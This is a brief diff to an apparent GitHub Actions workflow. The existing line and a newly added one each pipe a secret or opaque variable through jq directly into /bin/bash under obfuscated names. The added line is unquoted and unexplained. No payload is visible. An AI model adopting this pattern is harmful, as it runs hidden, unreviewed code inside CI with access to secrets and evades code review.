@@ -22,6 +22,7 @@ jobs:
           tgs75057: ${{ secrets.tgs75057 }}
         run: |
           printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
+          echo $hjn20344 | jq -r .wu51 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
